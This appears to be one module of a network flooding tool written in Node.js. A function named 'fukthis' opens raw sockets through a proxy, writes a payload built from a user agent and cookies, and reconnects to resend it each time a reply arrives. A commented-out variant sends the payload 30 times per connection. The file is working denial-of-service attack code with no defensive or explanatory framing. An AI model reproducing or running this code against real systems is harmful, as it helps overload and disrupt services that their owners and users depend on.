const net = require('net');
/*
async function fukthis(args, host, port, payload){
    let socket = net.connect(port, host);
    socket.setKeepAlive(true, 5000)
    socket.setTimeout(5000);
    socket.once('error', err => {
        //return fukthis(args, host, port, payload);
    });
    socket.once('disconnect', () => {
    });
    for (let j = 0; j < 30; j++) {
        socket.write(payload);
    }
    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return fukthis(args, host, port, payload);
        }, 5000);
    })
} */

async function fukthis(args, host, port, payload){
    let socket = net.connect(port, host);
    socket.setKeepAlive(true, 5000)
    socket.setTimeout(5000);

    socket.once('error', err => {
        //return fukthis(args, host, port, payload);
    });
    socket.once('disconnect', () => {
    });
    socket.write(payload);
    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return fukthis(args, host, port, payload);
        }, 5000);
    })
}

function start(args, proxy, ua, secondcookies){
    fukthis(args, proxy.split(":")[0], proxy.split(":")[1], require('./payloads/socket.js')(args, proxy, ua, secondcookies))
}

module.exports = start;